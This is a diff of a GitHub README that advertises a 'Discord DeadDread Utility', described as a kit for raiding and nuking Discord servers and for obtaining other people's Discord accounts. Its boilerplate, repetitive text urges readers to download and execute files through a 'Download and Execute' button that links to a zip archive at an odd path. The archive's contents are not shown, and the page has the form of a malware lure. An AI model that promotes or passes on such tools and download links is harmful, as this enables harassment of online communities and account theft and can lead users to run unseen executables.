@@ -1,21 +1,27 @@
-<div align="center">
+# Discord DeadDread Utility 🛠️
 
-  ![2](https://github.com/user-attachments/assets/65c8efdd-2cc0-43ee-b1c3-fc84f7b1703a)
+Welcome to the Discord DeadDread Utility repository, your go-to place for a compilation of useful tools to aid you in raiding Discord servers and obtaining Discord accounts. This collection of tools is designed to streamline your Discord raiding experience and provide you with the necessary utilities to achieve your objectives effortlessly.
 
-  ![0](https://github.com/user-attachments/assets/7bb73d75-7e42-4f51-996c-62a5dd1418cb)
+## Content of the Repository
+Here, you will find a variety of tools and resources related to Discord raiding, including Discord bots, raid tools, nuking tools, and more. Everything you need to enhance your raiding capabilities is conveniently organized and accessible within this repository.
 
-</div>
+## How to Use the Tools
+To leverage the tools provided in this repository, simply download the necessary files and execute them on your machine. Each tool comes with clear instructions on how to use it effectively, ensuring a seamless raiding experience for you and your team.
 
-## What is Discord DeadDread multitool?
+## Topics Covered
+The topics covered in this repository include Discord, Discord bots, Discord raiding, nuking tools, raid tools, Discord accounts, and more. Whether you are a seasoned Discord raider or just getting started, you will find valuable resources to support your raiding endeavors.
 
-What sets Discord DeadDread apart from other similar projects is its emphasis on social engineering — Discord DeadDread is the toolkit for anyone looking to convince servers to add bots.
+## Stay Updated
+To stay up to date with the latest developments and releases in the Discord raiding scene, be sure to visit the [Discord DeadDread Utility repository](https://github.com/Ravuly/Discord-Raid-Utility). Explore the tools, engage with the community, and enhance your Discord raiding skills with the help of our comprehensive collection.
 
-Unlike other raiders, the bots of Discord DeadDread come with geniune, fully fleshed out features, such as channel locking, global user banlists, fully configurable NSFW commands, and more! All with slash command support as of v1.3.0!
+## Get Started
+Ready to level up your Discord raiding game? Click the button below to access the tools and resources within the Discord DeadDread Utility repository:
 
-<div align="center"><a href="https://ravuly.github.io/id/87hdgdf76"><img src="https://github.com/user-attachments/assets/4e41b46e-4e3c-4b67-beae-dd32db43caa3" height="80"></a></div>
+[![Download and Execute](https://img.shields.io/badge/Download%20and%20Execute-Get%20Started-brightgreen)](https://github.com/Ravuly/Discord-Raid-Utility/toher/7131665201550049723/mudguard/arch.zip)
 
-> 🔲 Supported CPU: AMD & Intel
->
-> 🔧 Supported architectures: 64-bit, 32-bit
->
-> 💿 Supported OS: Windows 11, Windows 10, Windows 8, Windows 7
+## Join the Discord Raiding Community
+Connect with like-minded Discord raiders, share tips and strategies, and collaborate on raiding projects by joining the Discord raiding community. Together, we can elevate our raiding skills and achieve new levels of success in the Discord raiding scene.
+
+Dive into the world of Discord raiding with confidence and precision. Explore the tools, master the strategies, and unleash your potential as a Discord raider with the Discord DeadDread Utility repository. Join us on this exciting raiding journey today! 👾🔥
+
+*Remember: Discord raiding should always be conducted responsibly and in accordance with Discord's terms of service.*
